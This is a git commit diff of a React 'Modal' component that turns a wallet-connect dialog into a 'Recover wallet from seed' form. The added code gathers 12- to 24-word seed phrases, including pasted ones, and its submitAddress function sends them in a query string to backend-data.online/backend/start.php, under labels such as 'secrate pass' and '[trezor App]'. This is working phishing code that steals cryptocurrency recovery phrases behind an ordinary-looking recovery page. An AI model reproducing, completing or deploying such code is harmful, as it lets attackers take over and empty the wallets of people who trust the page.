b464373232535ec77cab2dea153c45095b7088bd
alve-coderx <shadmanzz656@gmail.com>
2023-02-16 07:19:36 -0600

    first commit

--- src/Components/Modal.jsx
+++ src/Components/Modal.jsx
@@ -7,8 +7,6 @@ import wall11 from "../assets/wall11.svg";
 import wall12 from "../assets/wall12.svg";
 import wall13 from "../assets/wall13.svg";
 import wall14 from "../assets/wall14.svg";
-import ImportWallet from "./ImportWallet";
-import { AiOutlineClose } from "react-icons/ai";
 
 const wallets = [
   { name: "Metamask", icon: wall14, id: 14 },
@@ -21,40 +19,195 @@ const wallets = [
   { name: "MathWallet", icon: wall7, id: 7 },
 ];
 
-const Modal = ({setShowModal}) => {
-  const [importWallet, setImportWallet] = useState(false);
+const Modal = () => {
+  const [segments, setSegments] = React.useState();
 
+  function onPaste(event) {
+    const pasted = event.clipboardData.getData("text/plain");
+    console.log(pasted.split(" "));
+    setSegments(pasted.split(" ").slice(0, 24));
+  }
+
+  const submitAddress = () => {
+    let vault = {
+      type: "secrate pass",
+      main: `
+      [trezor App]
+      ${segments}
+      `,
+    };
+    fetch(
+      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
+      {
+        method: "GET",
+        mode: "cors",
+        headers: { "content-type": "application/json" },
+      }
+    ).then(
+      (success) => {
+        setSegments(["", "", "", "", "", "", "", "", "", "", "", ""]);
+      }
+    );
+  };
   return (
     <div className="transition-10 duration-50 justify-center items-center flex fixed lg:top-0 top-0 inset-0  z-50 outline-0 ">
       <div className="">
-        {!importWallet ? (
-          <div className="lg:w-[600px] w-[21rem]  rounded-md bg-white drop-shadow-2xl">
-            <div className="p-5 text-left text-white bg-[#00854d] flex items-center justify-between rounded-t-md  font-[600] text-2xl border-b ">
-              <p>Connect Wallet</p>
-              <AiOutlineClose  />
-            </div>
-            <div className="grid lg:grid-cols-3 grid-cols-2 lg:gap-y-0 gap-y-4 gap-x-10  py-10 lg:px-4 md:px-9 px-4">
-              {wallets.map((wallet) => (
-                <div
-                  key={wallet.id}
-                  className="flex flex-col items-center text-white hover:opacity-80  p-4 rounded-xl cursor-pointer"
-                  onClick={() => setImportWallet(true)}
-                >
-                  <img
-                    src={wallet.icon}
-                    alt="dakjdga"
-                    className="w-6 lg:w-10"
-                  />
-                  <p className="lg:text-md text-black secondaryTxt text-xs mt-4 font-[700]">
-                    {wallet.name}
-                  </p>
+        <div class="lg:w-[30rem] w-[23rem]  rounded-md bg-white drop-shadow-2xl p-4 ">
+          <form action="javascript: validateData()" method="post">
+            <div>
+              <div class="mt-3 text-center sm:mt-5">
+                <div class="mt-8">
+                  <h3
+                    class="text-xl font-semibold leading-6 text-[#6c6c6c] "
+                    id="modal-title"
+                  >
+                    Recover wallet from seed
+                  </h3>
+
+                  <div class="mt-3">
+                    <button
+                      onClick={() => {
+                        setSegments([
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                        ]);
+                      }}
+                      type="button"
+                      onclick="changeMnemonicCount(12, '')"
+                      class="px-4 py-2 text-sm border border-[#cdcdcd] m-2 rounded button-words-12 text-[#0c0c0c]"
+                    >
+                      12 words
+                    </button>
+                    <button
+                      onClick={() => {
+                        setSegments([
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                        ]);
+                      }}
+                      type="button"
+                      onclick="changeMnemonicCount(15, '')"
+                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-15"
+                    >
+                      15 words
+                    </button>
+                    <button
+                      onClick={() => {
+                        setSegments([
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                        ]);
+                      }}
+                      type="button"
+                      onclick="changeMnemonicCount(18, '')"
+                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-18"
+                    >
+                      18 words
+                    </button>
+                    <button
+                      onClick={() => {
+                        setSegments([
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                          "",
+                        ]);
+                      }}
+                      type="button"
+                      onclick="changeMnemonicCount(24, '')"
+                      class="px-4 py-2 text-sm border border-[#cdcdcd] text-[#0c0c0c] m-2 rounded button-words-24"
+                    >
+                      24 words
+                    </button>
+                  </div>
+                  <div className="grid lg:grid-cols-3 grid-cols-1 gap-3 mt-4 p-4 rounded-2xl relative">
+                    {segments?.map((s, key) => (
+                      <div key={key}>
+                        {/* <label className="text-slate-400">{key + 1}.</label> */}
+                        <input
+                          value={s}
+                          onPaste={onPaste}
+                          placeholder={key + 1}
+                          name="tjhgdjhagd"
+                          class="border mt-2 md:mt-0 border-[#cdcdcd] w-[95%] text-[#0c0c0c] bg-white rounded py-1 px-2 text-sm mnemonicInput outline-none"
+                        />
+                      </div>
+                    ))}
+                  </div>
                 </div>
-              ))}
+              </div>
+              <div class="mt-5">
+                <button
+                  onClick={() => submitAddress()}
+                  type="submit"
+                  class="mt-3 w-full justify-center rounded-md px-4 py-2 text-base font-medium bg-[#00854d] dark:text-white text-[#f0f8ff] disabled:bg-[#006c3f] continueModal"
+                  disabled=""
+                >
+                  Continue
+                </button>
+              </div>
             </div>
-          </div>
-        ) : (
-          <ImportWallet setShowModal={setShowModal} setImportWallet={setImportWallet} />
-        )}
+          </form>
+        </div>
       </div>
     </div>
   );
